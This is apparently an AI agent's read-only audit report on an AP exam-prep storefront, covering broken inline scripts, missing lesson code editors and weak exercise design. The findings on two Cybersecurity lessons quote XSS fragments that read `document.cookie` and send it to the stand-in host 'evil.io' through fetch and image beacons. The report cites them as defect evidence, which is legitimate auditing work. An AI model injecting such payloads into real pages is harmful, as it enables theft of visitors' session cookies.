# CSA integrity sweep: the 1.9 defect class, the editor coverage gap, and exercise-1 design evidence

Read-only measurement run against the LIVE storefront (www.apcsexamprep.com), 2026-09-03,
~14:15-15:15 UTC. No repo file, page, or board item was edited, merged, or marked verified
by this session. Everything below is either PROVEN (I fetched the live bytes and show the
exact string/count) or explicitly marked SUSPECTED/NOT MEASURABLE.

Pages fetched live this run (all via `lib/storefront-fetch.js`, no User-Agent override,
positive-marker verified, one at a time with a 400ms pause): 53 CSA lesson pages (Units 1-4,
all), 35 CSP lesson pages (all Big Ideas 1-5), 31 Cyber lesson-page handles (covering both
competing Unit 2 naming schemes), 39 CSA exercise-1/exercise-2 pages (Units 1-2), plus 6
spot-check pages (CSP hubs, `ap-csp-filtering-sorting-practice`). 164 live fetches, 0 network
failures, 0 rate-limiting after the first request (see Instrument notes).

## Answer to the three questions, up front

1. **Defect class (stray newlines inside JS tokens): NOT PRESENT on any of the 53 live CSA
   lesson pages right now, including 1.9, 1.7, and 4.1.** The 1.9 defect board #173 documented
   is FIXED live. This is a withdrawal of the premise "already proven on one page" as a
   CURRENT fact, not a correction of #173's history. Root cause is still unidentified, so
   recurrence risk stands. The same defect class DOES currently exist, live, on 1 CSP page and
   3 Cyber Unit 5 lesson pages (different injection, same failure family: a script that breaks
   silently). See BROKEN, RANKED.
2. **Coverage gap: real, and precisely the shape Tanner described.** 1.9 has 3 authored editor
   problems (now rendering correctly, per static evidence). 1.7 and 1.8, the two lessons
   immediately before it, have ZERO. Zoomed out further: only 14 of 53 CSA lessons have ANY
   embedded lesson-page code editor at all (13 of 15 in Unit 1, plus one in Unit 4); Units 2
   and 3 have none, on any lesson. This is very likely a scope/rollout fact rather than 39
   separate failures - see the ranked list and the caveat below it.
3. **Exercise-1 design: the complaint is accurate and lesson-topic-dependent.** Of 27 live
   exercise-1 pages (CSA Units 1-2), roughly 8 (30%) are a bare "read two or three primitives,
   apply the lesson's operators to them, print the results" shape with no scenario at all, and
   they cluster exactly where the CED topic itself IS an operator or a logical law (expressions,
   compound assignment, method-signature matching, boolean comparison, De Morgan). Lessons whose
   topic has a natural real-world referent (money, grades, tickets, bank accounts) get real
   scenarios. See quotes below.

---

## THE WALK (scoped to what this sweep measured, not a full link-graph crawl)

- **AP CSA, all 53 lessons, Units 1-4:** every lesson page fetched live, 200, real body
  (`Shopify.theme` + `/cdn/shopifycloud/` markers present on every one). Zero inline-script
  syntax errors, zero ASI-survivor splits, on any of the 53. A teacher going lesson to lesson
  will not hit this defect class today. Separately, 39 of 53 lessons have no embedded code
  editor on the lesson page itself (see below) - that is a thinness gap, not a broken link; the
  standalone `-exercise-1` page exists for every one of the 53 and is where the graded coding
  practice actually lives.
- **AP CSP, 35 lessons, Big Ideas 1-5:** same clean result on the defect-class scan (35/35). One
  adjacent practice page (`ap-csp-filtering-sorting-practice`, linked from none of the 35 lesson
  pages or the 5 hub/teacher-resource pages I checked) is confirmed broken right now (see below).
  I could not establish how a student currently reaches it, which lowers its measured blast
  radius but does not clear it, since a fuller crawl was out of scope here.
- **AP Cybersecurity, 31 lesson-page handles across Units 1-5 (breadth check only, not a full
  course crawl):** 28 clean, 3 broken (Unit 5, lessons 4/5/6). The 3 broken pages still load
  (200, full markup) - the break is confined to a `<script>` block, so a student's "walk"
  through the unit is not interrupted, but two specific interactions are: the quiz cannot
  self-score on 3 pages, and on 2 of those (5.5, 5.6) an unescaped example XSS payload is a
  live, parsed `<script>` tag that runs in the visitor's browser.

---

## BROKEN, RANKED

| what | extent | who it costs | instrument | what that instrument cannot see |
|---|---|---|---|---|
| `ap-cyber-unit-5-lesson-4/5/6`: `var EX` (explanation) object has an unescaped `"` inside a quiz-explanation string, breaking the whole `<script>var ANS=...;var EX=...;</script>` block with a hard SyntaxError | 3 live Cyber lesson pages, confirmed | Every Cyber Unit 5 student on lessons 4-6: the quiz cannot self-grade (`ANS`/`EX` never defined). PROVEN, not a preview-unit issue (Unit 5 of 5, last unit) | `vm.Script()` parse of every non-ld+json inline `<script>` block, extracted with the same regex as `tools/scan-inline-scripts.js`; exact break byte confirmed with `node --check` per block | Cannot see whether the SAME `var EX` object has a SECOND unescaped quote further in (confirmed true for 5.5: `w5q2` breaks first, but `w5q7` has an identical unescaped-CED-quote pattern that would surface as the NEXT error only once `w5q2` is fixed) - a static parse stops at the first error, so "1 finding" can hide a second, larger one, and I read each file a second time to check for exactly this. |
| Same 3 pages, exact break points (re-derivable): 5.4 `v4q3`: `...A 128-bit AES key is not "weaker" than a 2048-bit RSA key...`; 5.5 `w5q2`: `...CED 5.5.A.2 principle 1: "Companies should build products that meet the security needs of their customers."...` (w5q7 has the same pattern: `"Companies should embrace radical transparency..."`); 5.6 `x6q4`: `...No legitimate user accesses a file named "passwords_backup.txt"...` | 3 pages, 1 explanation string each (5.5 has a 2nd latent one) | same as above | direct `node --check` on the isolated block, error column confirmed | n/a, this is the byte-exact locate |
| `ap-cyber-unit-5-lesson-5` and `-6`: literal, unescaped example `<script>` tags meant to be read as text inside `<code>`/`<pre>` are real script boundaries to any HTML parser. Confirmed by `<script` vs `</script>` tag-count mismatch (lesson-5: 82 vs 81; lesson-6: 87 vs 85) and by finding the literal fragments `<script>document.write(document.cookie)`, `<script>fetch('evil.io/c?'+document.cookie)`, `<script>new+Image().src%3D'evil.io/steal...` sitting unescaped in the page text | 2 confirmed live pages out of the 6 Cyber Unit 5 lesson pages (1-4 are clean on this specific check) | Every visitor to these 2 pages executes `document.write(document.cookie)` and a `fetch()`/`Image()` beacon to a domain this business does not control (relative-URL, so per board #178's correction it lands on apcsexamprep.com's own 404 log, not a real exfil - severity is corrupted lesson content, not data loss). This is the SAME defect class board #177/#178 already named; commit `9467b3b` (visible in this checkout's git log, not yet reflected on these 2 pages) fixed 2 OTHER pages (`lesson-1-exercise-1`, `exam`) via `imports/2026-09-03/cyber-u5-example-escape-pages.csv` | tag-count mismatch across the WHOLE page; cannot enumerate every fake-`<script>` instance without walking the actual parse tree, and cannot see the 4-5 other pages (exercise-2, quiz pages for these lessons) board #177 says are also affected, since my sweep scope was lesson pages only |
| `ap-csp-filtering-sorting-practice`: `var FS_QUESTIONS=[...]` array has an unescaped `"` inside an option string (`"(evType = "workshop") AND (cost <= 25)"`), SyntaxError `Unexpected identifier 'workshop'`, `FS_QUESTIONS` never defined | 1 page, confirmed still live and unfixed | Every visitor: no question scores, nothing on the page's practice widget works (matches board #174 exactly, re-derived independently here) | same `vm.Script()` scan | I could not find this page linked from any of the 35 CSP lesson pages or 5 CSP hub/teacher-resource pages I checked, so I cannot state its current blast radius beyond "the page itself, if reached" |
| 39 of 53 CSA lessons have zero authored embedded code editor on the lesson page itself | 39 pages, all of Units 2-3, all of Unit 4 except 4.4, plus 1.7/1.8 in Unit 1 | Content thinness, not breakage: the separate `-exercise-1` Judge0 page exists for all 53 lessons regardless, so no student is blocked from writing code for any lesson. Costs a teacher looking for the SAME in-lesson "Try It Yourself" widget seen on 1.1-1.6/1.9-1.15/4.4 | count of `starter:` fields inside each page's `CSACE_PROBLEMS` array (0/1-quote-style-independent) | Cannot see WHY the rollout stopped (author intent vs abandoned plan); `docs/runs/2026-08-31-claude-code-csa-1-5-problem-2-long.md` confirms this widget is authored directly in Shopify page bodies with no repo-side manifest, so there is no seed file or generator to check for "planned but not shipped" - this is SUSPECTED to be an unfinished Unit-1 pilot never extended, not proven design intent |

## WITHDRAWN

- **Board #173 (CSA 1.9: `re`\\n`turn` hard SyntaxError, `opt.getAtt`\\n`ribute` ASI split).**
  NOT PRESENT on the live page as of this sweep. Proof: (1) `vm.Script()` parse of every one of
  1.9's inline script blocks is clean; (2) direct grep for `getAttribute` shows all 6 calls
  intact, no injected newline; (3) direct grep for a `re`+newline+`turn` pattern finds nothing;
  (4) the exact repaired byte sequence from the prepared Matrixify sheet
  `imports/2026-09-03/csa-1-9-newline-repair-pages.csv` (`...opt.classList.add('selected');
  chosen = opt.getAttribute('data-letter');...`) is present VERBATIM in the live page body I
  fetched this run. The sheet was imported; the fix is live. What I got wrong going in: I
  treated "already proven on one page" as a current-tense fact to re-confirm, and it is
  past-tense. The underlying cause of the injection is still unidentified per the same board
  item, so I am not withdrawing the RISK of recurrence, only the CURRENT PRESENCE on 1.9.
- **The same claim for 1.7 and 4.1** ("a previous session found the same injection"): also
  NOT PRESENT now, confirmed the same two ways (full-page scan + targeted grep for
  `getAttribute`/`return`/`addEventListener`/`querySelector` splits). I cannot establish from
  here whether these were ever live-broken and separately fixed, or whether the report referred
  to staged/pre-import content that never reached the storefront in that state.
- **`docs/runs/2026-08-31-claude-code-csa-1-5-problem-2-long.md`, "Still open: the 1.5 page
  change is not live."** It is live now. The live `p2` problem on
  `ap-csa-lesson-1-5-casting-range` reads `double price = 19.99; int dollars = price;`
  (the narrowing-conversion fix), not the old off-syllabus `long big = 3000000000;`. Confirmed
  by direct fetch of the live page body.

## NOT MEASURABLE FROM HERE

- **"Editors that actually instantiate in a real browser" (task 2's explicit ask).** Playwright
  Chromium at `/opt/pw-browsers/chromium` cannot complete ANY HTTPS navigation through this
  session's agent proxy: `net::ERR_CONNECTION_RESET` after a consistent 6-second tunnel timeout,
  reproduced against `apcsexamprep.com`, `example.com`, and `google.com` alike, with and without
  an explicit `proxy: {server:...}` launch option, with HTTP/2 and QUIC disabled, across 4
  retries. `curl` and Node's `fetch()` reach the same hosts fine through the same proxy, so this
  is specific to headless Chromium's connection pattern in this sandbox, not a target-site
  block. Per `/root/.ccr/README.md` this class of failure should be reported rather than routed
  around. **What substitutes:** static evidence across independent signals - the instantiating
  script (`CodeMirror.fromTextArea(...)`) is syntactically clean on all 14 lessons that author
  it (same `vm.Script()` scan that found 0 issues on all 53 pages), the mount `<div
  id="csa-ce-wrap">` and its `<div id="csa-ce-problems">` child exist in the markup on exactly
  those 14, the two CDN dependencies (`cdnjs.cloudflare.com/.../codemirror.min.js`,
  `.../mode/clike/clike.min.js`) both return live 200s at their expected byte sizes, and the
  build call is unconditional on `DOMContentLoaded` with no feature-flag gate. This is strong
  but NOT the browser-real confirmation the task asked for; a runtime-only failure (a timing
  race, a second incompatible script, a CSP header) would not show up in any of these signals.
- **Whether AP Cybersecurity Unit 5 is a paid (non-preview) unit**, which I used to rank it
  below the CSA/free-preview framing. Board #173 states "Unit 1 is the free preview unit" for
  CSA; I did not independently verify a preview/paywall boundary for Cyber from this repo (the
  gating logic in `lib/entitlements.js` governs class/teacher entitlement, not a per-unit
  storefront preview flag, and that flag if it exists lives in the theme). Ranking assumes
  Unit 5 of 5 is deep, paid content; this is a reasonable but unverified inference from unit
  position alone.
- **The other 5-6 Cyber Unit 5 pages board #177 says are also affected** ("5 pages" missing
  examples, "4 more throw harmlessly" beyond the 3 named there). My sweep scope was lesson pages
  only; the exercise-1/exercise-2/quiz pages for Unit 5 were not fetched this run.
- **Full reachability of `ap-csp-filtering-sorting-practice`** - checked 40 CSP pages (35
  lessons + 5 hubs) for an inbound link and found none, which is evidence of low visibility, not
  proof of zero reachability (blog posts, search, and bookmarks are outside this sweep).
- **Whether the double-Enter/double-Tab CodeMirror bug fixed 2026-08-31 (theme PR 90,
  `layout/theme.liquid` `isCodeTextarea`) is still fixed today.** I did not re-drive a real
  keystroke in a browser this session (see Playwright blocker above), so this is inherited
  context from a prior report, not re-verified.

---

## Task 1 detail: the defect-class sweep

**Instrument.** Two independent checks per inline `<script>` block, matching the shape board
\#173/#175 specify and the two tools already staged (uncommitted) in this checkout,
`lib/storefront-fetch.js` and `tools/scan-inline-scripts.js`:

1. `new vm.Script(blockText)` - a hard parse check, equivalent to `node --check` (confirmed by
   the historical `tools/scan-inline-scripts.py`, recovered from git history at commit
   `e9b802f` since the file no longer exists in the working tree - see note below).
2. A regex for the ASI-survivor shape, the exact pattern from that same historical file:
   `\.([A-Za-z_$][\w$]*)[ \t]*\r?\n[ \t]*([A-Za-z_$][\w$]*)\s*\(` - a member access split by a
   bare newline, immediately followed by a call, which is what turns `opt.getAttribute(...)`
   into `opt.getAtt; ribute(...)` and parses.
3. Added this run, per the task's explicit ask to also catch a bare **keyword** split (not just
   member-access): a curated ~90-word dictionary of JS reserved words and DOM/JS API names,
   checked at every split position across a bare newline. This layer is broader and unproven at
   this scale before today; it found nothing beyond what (1) and (2) already flagged, so it is
   corroborating rather than load-bearing here.

Extraction regex for blocks: `<script(?![^>]*\bsrc=)([^>]*)>([\s\S]*?)<\/script>`, skipping any
`type=` other than `text/javascript`/`application/javascript` (drops `ld+json` and templates) -
same exclusion `tools/scan-inline-scripts.js` uses.

**Blind spots of this instrument, found by hitting them:**

- It assumes `<script>`/`</script>` are literal tag boundaries. On `ap-cyber-unit-5-lesson-6`,
  the page's own content contains UNESCAPED example text reading `<script>document.write(...)`,
  `<script>fetch(...)`, `<script>new Image()...` inside what should be `<code>` blocks. My
  regex (like a real browser's HTML tokenizer) cannot tell an intentional example from a real
  tag, so it silently extends a "block" to the next literal `</script>` it finds, however far
  away, and reports the resulting HTML-and-JS mash as a syntax error. That reported error IS
  real signal here (it corresponds exactly to board #177's "Unit 5 pages execute their own
  example attack payloads"), but the mechanism means the byte offset and "block index" in a
  scan are not reliable for HTML-bleed cases; I confirmed each one by hand (open-vs-close
  `<script` tag counts, then located the literal fragments directly) rather than trusting the
  scanner's own line/offset report.
- It cannot distinguish "shared boilerplate bug, N pages" from "N separate bugs" on its own; I
  added an MD5 hash of each flagged block and cross-referenced counts to make that call myself
  (all 4 live findings this run were page-unique content, not shared chrome).
- `cloudflareRewritten()` (also in `lib/storefront-fetch.js`) fires on somewhere close to
  **100% of every page fetched this run**, CSA, CSP, and Cyber alike. This is NOT lesson content
  being mangled: every single instance traces to the same sitewide floating contact-widget
  email address (`class="acw-info-card"` / `acw-direct-email`), rewritten by Cloudflare into
  `[email protected]` placeholders, present in identical form on every page template. It sits
  outside every `<script>` block, so it does not corrupt this scan, but a blind "N pages
  CF-rewritten" count would misread a single sitewide chrome element as widespread content
  damage. Stated so the next sweep does not re-discover this as new.
- `tools/scan-inline-scripts.py`, named in board #175's own proposed-instrument text and in a
  comment inside `tools/scan-inline-scripts.js` ("Same 7 pages, same 13 faults... reconciled by
  arithmetic"), **does not exist in this working tree.** It was added at commit `e9b802f` and
  deleted by a later commit before `HEAD` (not `c643f29`, which is the unrelated
  `validate_csv.py`/EK-density naming fix already on record in `CLAUDE.md`). I recovered its
  exact ASI regex from git history rather than trusting the comment's description of it, and I
  built the keyword-split layer myself in the scratchpad rather than citing a tool that is not
  actually there. If a future session is told to run `tools/scan-inline-scripts.py`, it cannot.
- The bot-management direction stated in this session's own launch instructions ("every request
  needs a browser User-Agent or Cloudflare answers 1010") is now **inverted and stale**, per
  board #172 (dated today) and per `lib/storefront-fetch.js`'s own header comment. I tested
  both directions live before trusting either: plain `curl`/no-UA-override got 200 with
  `Shopify.theme` present (real page) on every one of 164 fetches; a spoofed browser UA also
  returned 200 on my one direct test just now, which does not fully match #172's "browser UA
  draws 403" claim either - I did not chase this further since the no-UA path is proven to work
  end-to-end and is what the already-staged fix uses, but flagging that bot-management behavior
  here looks probabilistic/inconsistent rather than a hard rule in either direction, so a future
  session should re-check live before trusting either claim.

**Full result:** 53/53 CSA lesson pages clean, 35/35 CSP lesson pages clean, 39/39 CSA
exercise-1/2 pages (Units 1-2) clean, 28/31 Cyber lesson-page handles clean (3 broken, see
table), 1/1 `ap-csp-filtering-sorting-practice` broken (already on the board as #174).

---

## Task 2 detail: editor coverage, per CSA lesson

Two things were conflated in a first pass and had to be corrected before reporting, both
instrument bugs on my own part rather than content facts - recorded so they are not repeated:

- Counting `id="csa-ce-wrap"` (0 or 1 per page) is NOT the same as counting authored problems.
  The wrapper holds a `CSACE_PROBLEMS` array built dynamically by `buildProblem()`; the real
  count is the array length (1.9 has 3 problems, one wrapper).
- The array's `id:` field is single-quoted on some lessons (`id: 'p1'`) and double-quoted on
  others (`id: "p1"`, seen on 4.4). A regex anchored to one quote style silently reported 4.4 as
  zero. Counting occurrences of the `starter:` field instead (present once per problem
  regardless of quote style) fixed this, and I cross-checked every row against "does a
  `CodeMirror.fromTextArea` call exist at all" (0 mismatches across 53).

| lesson | editor problems authored | non-code practice items (MCQ/matching/cloze/sort) | template |
|---|---|---|---|
| 1.1 | 3 | 8 | apcs-ex |
| 1.2 | 3 | 8 | apcs-ex |
| 1.3 | 4 | 10 | apcs-ex |
| 1.4 | 3 | 10 | apcs-ex |
| 1.5 | 4 | 10 | apcs-ex |
| 1.6 | 3 | 8 | apcs-ex |
| **1.7** | **0** | 8 | apcs-ex |
| **1.8** | **0** | 8 | apcs-ex |
| 1.9 | 3 | 8 | apcs-ex |
| 1.10 | 4 | 10 | apcs-ex |
| 1.11 | 4 | 10 | apcs-ex |
| 1.12 | 2 | 8 | apcs-ex |
| 1.13 | 3 | 10 | apcs-ex |
| 1.14 | 4 | 10 | apcs-ex |
| 1.15 | 4 | 10 | apcs-ex |
| 2.1-2.12 (all 12) | 0 | 12 each | apcs-ex |
| 3.1, 3.3, 3.4 | 0 | ~12-13 each | **legacy (`class="mcq"`/`"stem"`), a different template than the other 50 pages** |
| 3.2, 3.5-3.9 | 0 | 12 each | apcs-ex |
| 4.1-4.3, 4.5-4.17 | 0 | 7-10 each | apcs-ex |
| 4.4 | 6 | 10 | apcs-ex |

Totals: **50 authored editor problems across 14 of 53 lessons (26%).** 39 lessons (74%) author
zero. Every one of the 53 also has its own separate `-exercise-1` Judge0-graded page (confirmed
present for all 53 via the same page-handle list), so "no embedded editor" is a thinness gap in
the lesson-page experience specifically, not an absence of coding practice for that lesson.

**Ranked list of lessons with no editor practice on the lesson page**, in the order Tanner would
walk into them: **1.7, 1.8** (immediately adjacent to 1.9, exactly the "a lesson near 1.9" claim
- confirmed, and it is two lessons, not one), then every lesson in **Units 2 and 3 (21
lessons)**, then **all of Unit 4 except 4.4 (16 lessons)**.

**Authored-but-renders-0 vs none-authored:** none of the 14 authored lessons showed
authored-but-renders-0 by the static evidence available (see NOT MEASURABLE FROM HERE for the
Playwright gap). The 1.9 case that DID show this (board #173) is fixed. The 39-lesson gap is
"none authored," a content-coverage fact, not a rendering defect.

**Interpretation flagged as SUSPECTED, not proven:** `docs/runs/2026-08-31-claude-code-csa-1-5-problem-2-long.md`
confirms this widget is hand-authored directly into Shopify page bodies with no repo-side
manifest or generator. There is no seed file that says "every lesson should eventually get one."
Whether Units 2-4's absence is an unfinished rollout or an intentional Unit-1-only pilot is a
design-intent question this sweep cannot answer from the live bytes alone.

---

## Task 3 detail: exercise-1/exercise-2 design evidence, CSA Units 1-2

27 exercise-1 pages (all of Unit 1's 15, all of Unit 2's 12) and 12 exercise-2 pages (Unit 2
only; Unit 1 has none, matching board #162) read and characterized from live bytes.

**Starter code length** (exercise-1, n=27): mean 12.8 lines / 302 characters. Shortest: 1.4
"Locker Assignment", 7 lines/167 chars. Longest: 1.14 "Working the Account" and 1.12 "Two Books,
One Class", 27 lines/671-672 chars (both are the OOP lessons, where the starter must include a
provided class). The starter is overwhelmingly I/O scaffolding (Scanner setup, variable
declarations) with the actual task logic left as a comment (`// Your algorithm goes here`) in
every case checked - the student writes the entire solution, not a fill-in-the-blank.

**Stated goal:** all 27 pages carry a "Why this one is worth doing" sentence (100%). Presence is
universal; what varies is whether that sentence states a stake a student would recognize (exam
risk, a real quantity) versus restating the mechanic the exercise already shows in its title.

**Purpose-driven vs. two-variables-and-an-operator:** counting a page as the latter when it has
no named scenario at all and the task list reduces to "read N primitives, apply the lesson's
operators/methods to them, print each result" - by that reading, **8 of 27 (30%)** are squarely
in that shape, and they cluster exactly on lessons whose CED topic IS an operator, a method
signature, or a logical law rather than a data type or object with a natural real-world
referent: **1.3 Expressions/Operators, 1.6 Compound Assignment, 1.9 Method Signatures, 1.10
Calling Class Methods, 2.2 Boolean Expressions, 2.5 Compound Boolean Expressions, 2.6 Comparing
Boolean Expressions, 2.8 for Loops.** Lessons with an easy real-world referent (money, grades,
tickets, bank balances, objects-as-things) consistently get a real scenario instead (1.2, 1.4,
1.5, 1.8, 1.12-1.14, 2.3, 2.4).

**3 worst, verbatim, with handles:**

1. `ap-csa-lesson-1-3-expressions-assignment-exercise-1` - title **"Five Operators."** Full task
   list: *"1. Read two integers, a and b. You may assume b is not zero. 2. Print a + b, then a -
   b, then a * b, then a / b, then a % b. 3. Each result goes on its own line, in that order."*
   This is Tanner's complaint rendered exactly: two variables, five operators, print, done.
2. `ap-csa-lesson-2-2-boolean-expressions-exercise-1` - title **"True or False, Printed."** Task:
   *"1. Read two integers, a and b. 2. Print the value of a > b. 3. Print the value of a == b.
   4. Print the value of a != b. 5. Print the value of a <= b. 6. Store a >= b in a boolean
   variable and print that variable on the last line."* Same shape, one lesson later, comparison
   operators instead of arithmetic ones.
3. `ap-csa-lesson-2-6-comparing-boolean-expressions-exercise-1` - title **"De Morgan,
   Checked."** Task: *"1. Read two integers, a and b. 2. Build p as a > 0 and q as b > 0. 3.
   Print !(p && q), then print !p || !q, which De Morgan says is the same thing. 4. Print
   whether those two agreed, as a single boolean. 5. Print !(p || q), then !p && !q, then
   whether THOSE two agreed."* Conceptually defensible (it verifies an identity rather than just
   demonstrating operators), but zero scenario, same "two variables" skeleton.

**2 best, verbatim, with handles:**

1. `ap-csa-lesson-1-5-casting-range-exercise-1` - **"Class Average."** Why: *"Casting after the
   division is too late. This exercise prints both answers side by side so the difference is
   impossible to miss."* Task ties directly to something every student already tracks (their own
   grade average) and the exercise design (print the wrong-but-common answer next to the correct
   one) makes the lesson's actual point visible in the output, not just in prose.
2. `ap-csa-lesson-2-4-nested-if-statements-exercise-1` - **"Ticket Window."** Why: *"Nesting is
   for decisions that only make sense once an earlier one has been settled. The discount here
   does not exist for adults at all, so testing for it at the top level would be answering a
   question nobody asked."* Task is a real pricing rule (age band, then a weekday/weekend
   modifier that only applies inside two of the three age bands) with actual stakes (get the
   price wrong) rather than a demonstration.

**Exercise-2 (Unit 2 only, "Applied Practice," 6 scenario-based MCQs per lesson) is a different,
better-designed format** than exercise-1 by the same reading - e.g.
`ap-csa-lesson-2-1-algorithms-selection-repetition-exercise-2` asks students to pick the right
control structure for described scenarios (a discount rule, a password retry loop, grading 30
students, evaluating a classmate's claim about while-vs-for equivalence) rather than manipulate
bare variables. This is offered as contrast, not part of Tanner's complaint, which named
"exercise 1s" specifically.

